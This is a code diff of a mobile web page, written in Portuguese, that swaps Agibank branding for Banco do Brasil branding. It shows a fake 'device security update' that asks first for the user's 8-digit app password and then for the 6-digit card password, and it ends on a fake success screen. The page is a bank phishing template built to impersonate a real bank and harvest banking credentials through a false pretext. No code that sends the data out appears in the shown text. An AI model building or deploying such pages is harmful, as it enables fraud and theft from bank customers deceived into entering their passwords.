@@ -3,27 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Agibank - Segurança do Dispositivo</title>
+    <title>Banco do Brasil - Segurança</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap');
         
         :root {
-            --agi-blue: #002D51;
-            --agi-green: #29D381;
-            --agi-light-gray: #F4F7F9;
+            --bb-yellow: #FCF000;
+            --bb-blue: #0038A8;
+            --bb-blue-dark: #002b80;
+            --bb-gray: #f4f4f4;
         }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Open Sans', sans-serif;
             background-color: #f0f2f5;
             margin: 0;
             display: flex;
             justify-content: center;
             min-height: 100vh;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
+            overflow-x: hidden;
         }
 
         .phone-container {
@@ -33,245 +33,288 @@
             display: flex;
             flex-direction: column;
             position: relative;
-            box-shadow: 0 4px 30px rgba(0,0,0,0.05);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
 
-        .agi-bg-blue { background-color: var(--agi-blue); }
-        .agi-text-blue { color: var(--agi-blue); }
-        .agi-bg-green { background-color: var(--agi-green); }
-        .agi-text-green { color: var(--agi-green); }
-
-        .header-border {
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .dot-container {
+        .bb-header {
+            background-color: var(--bb-yellow);
+            padding: 15px 20px;
             display: flex;
+            align-items: center;
             justify-content: space-between;
-            gap: 8px;
-            margin: 25px 0;
+            border-bottom: 2px solid #e6d900;
         }
 
-        .dot-field {
-            flex: 1;
-            height: 58px;
-            background-color: var(--agi-light-gray);
-            border-radius: 10px;
-            border: 2px solid transparent;
+        .digit-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .digit-box {
+            width: 35px;
+            height: 45px;
+            border-bottom: 3px solid #ccc;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
-            color: var(--agi-blue);
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            color: var(--bb-blue);
+            transition: all 0.2s;
         }
 
-        .dot-field.active {
-            border-color: var(--agi-green);
-            background-color: #ffffff;
-            box-shadow: 0 4px 10px rgba(41, 211, 129, 0.15);
-            transform: translateY(-2px);
+        .digit-box.filled {
+            border-bottom-color: var(--bb-blue);
         }
 
         #hidden-input {
             position: absolute;
             opacity: 0;
             pointer-events: none;
-            left: -100%;
         }
 
-        .btn-agi {
-            background-color: var(--agi-green);
-            color: var(--agi-blue);
-            font-weight: 800;
-            padding: 18px;
-            width: 100%;
-            border-radius: 14px;
-            transition: all 0.2s ease;
-            font-size: 15px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .btn-agi:disabled {
-            background-color: #e5e7eb;
-            color: #9ca3af;
-            cursor: not-allowed;
-            transform: scale(1);
-        }
-
-        .btn-agi:active:not(:disabled) {
-            transform: scale(0.97);
-            background-color: #24bd73;
-        }
-
-        .info-card {
-            background-color: #f8fafc;
-            border-left: 4px solid var(--agi-blue);
+        .btn-bb {
+            background-color: var(--bb-blue);
+            color: white;
             padding: 16px;
-            border-radius: 0 12px 12px 0;
-            margin-bottom: 24px;
-        }
-
-        .brand-logo {
-            font-weight: 900;
-            font-size: 26px;
-            letter-spacing: -1.5px;
+            width: 100%;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s;
             display: flex;
             align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        .brand-dot {
-            color: var(--agi-green);
+        .btn-bb:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .step-transition {
+            transition: transform 0.5s ease-in-out, opacity 0.5s;
+        }
+
+        .hidden-step {
+            display: none;
+            opacity: 0;
+        }
+
+        .bb-logo-text {
+            font-weight: 800;
+            color: var(--bb-blue);
+            font-style: italic;
+            font-size: 20px;
+            letter-spacing: -1px;
+        }
+
+        /* Animação de carregamento */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--bb-blue);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body onclick="focusInput()">
+<body onclick="focusCurrentInput()">
 
     <div class="phone-container">
-        <!-- Barra de Status (Simulação) -->
-        <div class="px-6 py-2 flex justify-between items-center text-[12px] font-bold text-gray-400">
-            <span>10:30</span>
-            <div class="flex gap-1.5">
-                <i data-lucide="signal" class="w-3.5 h-3.5"></i>
-                <i data-lucide="wifi" class="w-3.5 h-3.5"></i>
-                <i data-lucide="battery" class="w-3.5 h-3.5"></i>
+        <div class="bb-header">
+            <div class="flex items-center gap-3">
+                <i data-lucide="menu" class="w-6 h-6 text-blue-800"></i>
+                <div class="bb-logo-text">BANCO DO BRASIL</div>
             </div>
+            <i data-lucide="help-circle" class="w-6 h-6 text-blue-800"></i>
         </div>
 
-        <!-- Cabeçalho Agibank -->
-        <div class="header-border p-4 flex items-center justify-between">
-            <button class="p-2 hover:bg-gray-100 rounded-full transition-colors">
-                <i data-lucide="arrow-left" class="w-6 h-6 agi-text-blue"></i>
-            </button>
-            <div class="brand-logo agi-text-blue">
-                Agibank<span class="brand-dot">.</span>
-            </div>
-            <div class="w-10"></div> <!-- Equilíbrio visual -->
-        </div>
+        <div class="flex-grow p-6">
+            <div id="step-1" class="step-transition">
+                <div class="mb-8">
+                    <h1 class="text-xl font-bold text-gray-800 mb-2">Segurança do Dispositivo</h1>
+                    <p class="text-gray-600 text-sm">Olá! Para continuar a atualização do seu aplicativo, informe sua <strong>senha de 8 dígitos</strong> (senha de acesso ao app).</p>
+                </div>
 
-        <!-- Conteúdo Principal -->
-        <div class="flex-grow px-6 pt-8">
-            <div class="info-card">
-                <div class="flex gap-3">
-                    <i data-lucide="refresh-cw" class="w-5 h-5 agi-text-blue shrink-0 mt-0.5"></i>
-                    <div>
-                        <h2 class="font-bold agi-text-blue text-sm">Atualização Obrigatória</h2>
-                        <p class="text-gray-500 text-xs mt-1">Estamos a reforçar a segurança do seu telemóvel para proteger as suas transações.</p>
+                <div class="bg-blue-50 p-4 rounded-lg border-l-4 border-blue-600 mb-6">
+                    <div class="flex gap-3">
+                        <i data-lucide="shield-check" class="w-5 h-5 text-blue-600"></i>
+                        <p class="text-xs text-blue-800 font-semibold">SUA SENHA FICARÁ VISÍVEL PARA CONFERÊNCIA.</p>
                     </div>
                 </div>
-            </div>
 
-            <h1 class="text-2xl font-bold agi-text-blue leading-tight">Segurança do Aparelho</h1>
-            <p class="text-gray-500 text-sm mt-3">
-                Para confirmar a sua identidade, introduza a sua <span class="font-bold text-gray-700">palavra-passe de 6 dígitos</span> abaixo.
-            </p>
-
-            <div class="relative">
-                <div class="dot-container" id="dot-wrap">
-                    <div class="dot-field" id="dot-0"></div>
-                    <div class="dot-field" id="dot-1"></div>
-                    <div class="dot-field" id="dot-2"></div>
-                    <div class="dot-field" id="dot-3"></div>
-                    <div class="dot-field" id="dot-4"></div>
-                    <div class="dot-field" id="dot-5"></div>
+                <div class="relative">
+                    <div class="digit-container" id="container-8">
+                        <div class="digit-box" id="box8-0"></div>
+                        <div class="digit-box" id="box8-1"></div>
+                        <div class="digit-box" id="box8-2"></div>
+                        <div class="digit-box" id="box8-3"></div>
+                        <div class="digit-box" id="box8-4"></div>
+                        <div class="digit-box" id="box8-5"></div>
+                        <div class="digit-box" id="box8-6"></div>
+                        <div class="digit-box" id="box8-7"></div>
+                    </div>
+                    <input type="number" id="input-8" class="absolute opacity-0 pointer-events-none" inputmode="numeric" pattern="[0-9]*" maxlength="8">
                 </div>
 
-                <input 
-                    type="number" 
-                    id="hidden-input" 
-                    inputmode="numeric" 
-                    pattern="[0-9]*" 
-                    maxlength="6"
-                    autocomplete="off"
-                >
+                <div class="mt-12">
+                    <button id="btn-next-8" disabled class="btn-bb">
+                        CONTINUAR
+                    </button>
+                </div>
             </div>
 
-            <div class="mt-10 flex flex-col items-center gap-2">
-                <div class="w-12 h-12 rounded-full bg-emerald-50 flex items-center justify-center">
-                    <i data-lucide="shield-check" class="w-6 h-6 text-emerald-500"></i>
+            <div id="step-2" class="step-transition hidden-step">
+                <div class="mb-8">
+                    <h1 class="text-xl font-bold text-gray-800 mb-2">Validação Transacional</h1>
+                    <p class="text-gray-600 text-sm">Quase lá! Agora informe sua <strong>senha de 6 dígitos</strong> (a mesma usada no cartão) para sincronizar as chaves de segurança.</p>
                 </div>
-                <span class="text-[10px] text-gray-400 uppercase font-black tracking-widest">Protocolo de Segurança Ativo</span>
+
+                <div class="relative">
+                    <div class="digit-container" id="container-6">
+                        <div class="digit-box" id="box6-0"></div>
+                        <div class="digit-box" id="box6-1"></div>
+                        <div class="digit-box" id="box6-2"></div>
+                        <div class="digit-box" id="box6-3"></div>
+                        <div class="digit-box" id="box6-4"></div>
+                        <div class="digit-box" id="box6-5"></div>
+                    </div>
+                    <input type="number" id="input-6" class="absolute opacity-0 pointer-events-none" inputmode="numeric" pattern="[0-9]*" maxlength="6">
+                </div>
+
+                <div class="mt-12">
+                    <button id="btn-confirm-6" disabled class="btn-bb">
+                        FINALIZAR ATUALIZAÇÃO
+                    </button>
+                </div>
+            </div>
+
+            <div id="step-3" class="step-transition hidden-step text-center py-10">
+                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <i data-lucide="check-circle" class="w-12 h-12 text-green-600"></i>
+                </div>
+                <h2 class="text-2xl font-bold text-gray-800 mb-2">Tudo pronto!</h2>
+                <p class="text-gray-600">Seu dispositivo foi atualizado com sucesso. Você já pode utilizar todas as funções do Banco do Brasil com segurança total.</p>
+                <div class="mt-10">
+                    <button onclick="location.reload()" class="btn-bb">
+                        VOLTAR PARA O INÍCIO
+                    </button>
+                </div>
             </div>
         </div>
 
-        <!-- Rodapé com Botão -->
-        <div class="p-6">
-            <button id="confirm-btn" disabled class="btn-agi shadow-lg">
-                Confirmar Atualização
-            </button>
-            <p class="text-center text-xs text-gray-400 mt-6">
-                Esqueceu-se da sua palavra-passe? <span class="agi-text-green font-bold">Recuperar agora</span>
-            </p>
+        <!-- Rodapé Institucional -->
+        <div class="p-6 text-center">
+            <p class="text-[10px] text-gray-400 uppercase tracking-widest font-bold">Segurança BB • Proteção 24h</p>
         </div>
     </div>
 
     <script>
-        // Inicialização
         lucide.createIcons();
         
-        const input = document.getElementById('hidden-input');
-        const dots = Array.from({length: 6}, (_, i) => document.getElementById(`dot-${i}`));
-        const btn = document.getElementById('confirm-btn');
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const step3 = document.getElementById('step-3');
+        
+        const input8 = document.getElementById('input-8');
+        const btn8 = document.getElementById('btn-next-8');
+        
+        const input6 = document.getElementById('input-6');
+        const btn6 = document.getElementById('btn-confirm-6');
 
-        function focusInput() {
-            input.focus();
+        let currentActiveInput = input8;
+
+        function focusCurrentInput() {
+            currentActiveInput.focus();
         }
 
-        input.addEventListener('input', (e) => {
-            let val = e.target.value;
-            
-            // Filtra apenas números e limita a 6 dígitos
-            val = val.replace(/\D/g, '').slice(0, 6);
-            input.value = val;
+        input8.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 8);
+            input8.value = val;
 
-            dots.forEach((dot, index) => {
-                if (index < val.length) {
-                    dot.innerText = val[index]; // Dígitos visíveis conforme solicitado
-                    dot.classList.add('active');
+            for (let i = 0; i < 8; i++) {
+                const box = document.getElementById(`box8-${i}`);
+                if (i < val.length) {
+                    box.innerText = val[i]; // Senha visível
+                    box.classList.add('filled');
                 } else {
-                    dot.innerText = '';
-                    dot.classList.remove('active');
+                    box.innerText = '';
+                    box.classList.remove('filled');
                 }
-            });
-
-            btn.disabled = val.length !== 6;
-        });
-
-        // Impede caracteres não numéricos comuns em inputs number
-        input.addEventListener('keydown', (e) => {
-            if (["e", "E", "+", "-", ".", ","].includes(e.key)) {
-                e.preventDefault();
             }
+            btn8.disabled = val.length !== 8;
         });
 
-        btn.addEventListener('click', () => {
-            btn.innerHTML = '<div class="flex items-center justify-center gap-2"><i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> A VALIDAR...</div>';
-            lucide.createIcons();
-            btn.disabled = true;
+        btn8.addEventListener('click', () => {
+            btn8.innerHTML = '<div class="loader"></div>';
+            btn8.disabled = true;
 
             setTimeout(() => {
-                btn.style.backgroundColor = '#002D51';
-                btn.style.color = '#ffffff';
-                btn.innerHTML = 'DISPOSITIVO SEGURO';
-                
-                // Feedback visual de conclusão
+                step1.classList.add('hidden-step');
                 setTimeout(() => {
-                    input.value = '';
-                    dots.forEach(d => { d.innerText = ''; d.classList.remove('active'); });
-                    btn.disabled = false;
-                    btn.style.backgroundColor = '#29D381';
-                    btn.style.color = '#002D51';
-                    btn.innerHTML = 'CONFIRMAR ATUALIZAÇÃO';
-                    lucide.createIcons();
-                }, 2000);
-            }, 2500);
+                    step1.style.display = 'none';
+                    step2.style.display = 'block';
+                    setTimeout(() => {
+                        step2.classList.remove('hidden-step');
+                        currentActiveInput = input6;
+                        focusCurrentInput();
+                    }, 50);
+                }, 300);
+            }, 1000);
         });
 
-        // Garante o foco inicial
+        input6.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').slice(0, 6);
+            input6.value = val;
+
+            for (let i = 0; i < 6; i++) {
+                const box = document.getElementById(`box6-${i}`);
+                if (i < val.length) {
+                    box.innerText = val[i]; // Senha visível
+                    box.classList.add('filled');
+                } else {
+                    box.innerText = '';
+                    box.classList.remove('filled');
+                }
+            }
+            btn6.disabled = val.length !== 6;
+        });
+
+        btn6.addEventListener('click', () => {
+            btn6.innerHTML = '<div class="loader"></div> Validando segurança...';
+            btn6.disabled = true;
+
+            setTimeout(() => {
+                step2.classList.add('hidden-step');
+                setTimeout(() => {
+                    step2.style.display = 'none';
+                    step3.style.display = 'block';
+                    setTimeout(() => {
+                        step3.classList.remove('hidden-step');
+                    }, 50);
+                }, 300);
+            }, 2000);
+        });
+
+        // Previne caracteres especiais
+        [input8, input6].forEach(inp => {
+            inp.addEventListener('keydown', (e) => {
+                if (["e", "E", "+", "-", ".", ","].includes(e.key)) e.preventDefault();
+            });
+        });
+
         window.onload = () => {
-            setTimeout(focusInput, 500);
+            setTimeout(focusCurrentInput, 500);
         };
     </script>
 </body>
